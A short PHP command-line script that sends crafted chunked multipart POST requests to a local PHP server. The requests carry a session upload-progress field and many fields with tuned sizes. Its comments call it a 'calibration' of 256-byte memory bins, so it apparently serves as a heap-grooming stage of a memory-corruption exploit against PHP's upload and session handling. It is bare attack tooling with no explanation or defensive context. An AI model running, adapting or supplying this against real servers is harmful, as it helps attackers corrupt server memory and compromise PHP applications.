<?php
declare(strict_types=1);
/* display_errors=Off B1 calibration: N bin-256 fields (231-byte values),
 * then the END cleanup session init. */
const BND = 'CCCCCCCCCC';
function part(string $n, string $v = ''): string {
    return '--' . BND . "\r\nContent-Disposition: form-data; name=\"$n\"\r\n\r\n" . $v . "\r\n";
}
$port = (int)($argv[1] ?? 8091);
$n = (int)($argv[2] ?? 160);
$vlen = (int)($argv[3] ?? 231);
$m = (int)($argv[4] ?? 0);
$vlen2 = (int)($argv[5] ?? (511*4096-25));
$out = part('PHPSESSID', str_repeat('a', 32));
$out .= part('PHP_SESSION_UPLOAD_PROGRESS', 'k0');
$val = str_repeat('V', $vlen);
for ($i = 0; $i < $n; $i++) {
    $out .= part(sprintf('v%04d', $i), $val);
}
$val2 = str_repeat('A', $vlen2);
for ($i = 0; $i < $m; $i++) {
    $out .= part(sprintf('f%04d', $i), $val2);
}
$out .= '--' . BND . "--\r\n";
$s = @stream_socket_client("tcp://127.0.0.1:$port", $e, $m, 5.0);
if (!$s) { fwrite(STDERR, "connect $m\n"); exit(1); }
stream_set_timeout($s, 30);
fwrite($s, "POST /index.php HTTP/1.1\r\nHost: x\r\nContent-Type: multipart/form-data; boundary=" . BND
    . "\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n");
for ($o = 0; $o < strlen($out); $o += 262144) {
    $c = substr($out, $o, 262144);
    fwrite($s, dechex(strlen($c)) . "\r\n" . $c . "\r\n");
}
fwrite($s, "0\r\n\r\n");
$resp = '';
while (!feof($s)) { $r = fread($s, 65536); if ($r === false || $r === '') break; $resp .= $r; }
fclose($s);
printf("n=%d vlen=%d m=%d body=%d status=%s\n", $n, $vlen, $m, strlen($out), strtok($resp, "\r\n"));
